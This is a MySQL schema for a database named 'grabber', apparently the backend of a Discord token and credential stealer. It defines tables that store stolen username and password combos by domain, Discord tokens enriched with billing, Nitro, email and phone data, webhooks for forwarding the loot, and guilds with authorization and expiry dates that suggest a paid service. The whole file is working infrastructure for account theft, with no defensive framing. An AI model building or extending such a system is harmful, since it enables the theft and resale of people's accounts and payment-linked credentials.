
CREATE DATABASE IF NOT EXISTS `grabber`;
USE `grabber`;

CREATE TABLE IF NOT EXISTS `combos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `domain` varchar(170) DEFAULT NULL,
  `username` varchar(170) DEFAULT NULL,
  `password` varchar(170) DEFAULT NULL,
  `guildId` varchar(24) DEFAULT NULL,
  `addedAt` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `domain_username_password` (`domain`,`username`,`password`) USING HASH
) ENGINE=InnoDB AUTO_INCREMENT=0 DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `forwarder` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uuid` varchar(50) DEFAULT NULL,
  `discord_webhook` varchar(170) DEFAULT NULL,
  `added` datetime DEFAULT curtime(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `uuid` (`uuid`)
) ENGINE=InnoDB AUTO_INCREMENT=0 DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `guilds` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `guild_id` varchar(50) NOT NULL,
  `authorized` int(11) NOT NULL DEFAULT 0,
  `billing_role` varchar(50) DEFAULT NULL,
  `boosts_role` varchar(50) DEFAULT NULL,
  `hqguild_role` varchar(50) DEFAULT NULL,
  `nitro_role` varchar(50) DEFAULT NULL,
  `added_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `expires_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `guild_id` (`guild_id`)
) ENGINE=InnoDB AUTO_INCREMENT=0 DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS `tokens` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `token` varchar(170) NOT NULL,
  `guildId` varchar(24) DEFAULT NULL,
  `hasBilling` mediumtext DEFAULT NULL,
  `hasNitro` int(11) DEFAULT NULL,
  `badges` varchar(50) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `phone` varchar(50) DEFAULT NULL,
  `discord_id` varchar(50) DEFAULT NULL,
  `username` varchar(50) DEFAULT NULL,
  `friend_count` varchar(50) DEFAULT NULL,
  `bio` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `addedAt` timestamp NULL DEFAULT current_timestamp(),
  `lastUpdated` timestamp NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `token` (`token`) USING HASH
) ENGINE=InnoDB AUTO_INCREMENT=0 DEFAULT CHARSET=utf8mb4;
